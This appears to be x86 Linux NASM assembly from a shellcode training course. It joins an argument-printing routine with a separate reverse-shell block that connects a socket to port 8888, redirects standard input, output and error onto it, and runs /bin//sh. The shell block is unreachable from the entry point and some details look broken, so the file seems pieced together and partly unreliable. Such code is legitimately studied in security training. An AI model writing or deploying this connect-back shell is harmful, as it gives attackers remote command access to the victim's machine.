; Filename: .nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:

	; Get argc
	pop ecx			; argc in ecx
	cmp ecx, 3
	jnz exit  		; If argc != 3 -> EXIT
    add ecx, '0'	; convert number to character
    push ecx		; need it in a buffer - use the stack
    mov ecx, esp	; address of buffer in ecx, as sys_write wants!    
    mov edx, 1		; number of bytes to write
    mov ebx, 1		; file descriptor - STDOUT
    mov eax, 4		; __NR_write
    int 80h
    pop   ecx      ; Dump number of args from stack

   
nextarg:
	pop ecx ; get pointer to string
	test ecx, ecx ; or "cmp ecx, 0"
	jz exit
	; now we need to find the length of our (zero-terminated) string
	xor edx, edx ; or "mov edx, 0"


getlen:
	cmp byte [ecx + edx], 0
	jz gotlen
	inc edx
	jmp getlen

gotlen:
	; now ecx -> string, edx = length
	mov   eax,4    ; Function 4 - write"
	mov   ebx,1    ; to stdout
	int   80h
	; probably want to print a newline here, "for looks"
	jmp nextarg ; cook until done


a:
	; Print message
	xor eax, eax
	mov al, 0x4
	xor ebx, ebx
	mov bl, 1
	push 0x0a20202e
	push 0x2e2e6c6c
	push 0x65687320
	push 0x65737265
	push 0x76657220
	push 0x676e696e
	push 0x77617053
	mov ecx, esp
	xor edx, edx
	mov dl, 28
	int 0x80


	; Socket - 359
	; int socket (
    ;  int domain = 2;
    ;  int type = 1;
    ;  int protocol = 0;
	; ) =  14;
	xor eax, eax
	mov ax, 0x167
	xor ebx, ebx
	mov bl, 2
	xor ecx, ecx
	mov cl, 1
	xor edx, edx
	int 0x80
	mov dword esi, eax


	;dup2 - 0
	xor eax, eax
	mov al, 0x3f
	mov ebx, esi
	xor ecx, ecx
	int 0x80
	;dup2 - 1
	xor eax, eax
	mov al, 0x3f
	mov ebx, esi
	xor ecx, ecx
	mov cl, 1
	int 0x80
	;dup2 - 2
	xor eax, eax
	mov al, 0x3f
	mov ebx, esi
	xor ecx, ecx
	mov cl, 2
	int 0x80


	;Connect - 362
	xor eax, eax
	mov ax, 0x16a
	mov ebx, esi
	xor edi, edi
	push dword edi 		; push 0 => ip 0.0.0.0
    push edi			; port 8888, big endian
    push word 0xb822 	; port 8888, big endian
    push word 2 
	mov ecx, esp
	xor edx, edx
	mov dl, 0x66 		; 102
	int 0x80


	; Execve
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80


exit:
   mov   eax,1
   mov   ebx,ecx ; ??? return... something...
   int   80h      ; Exit




section .bss
	socket resd 1

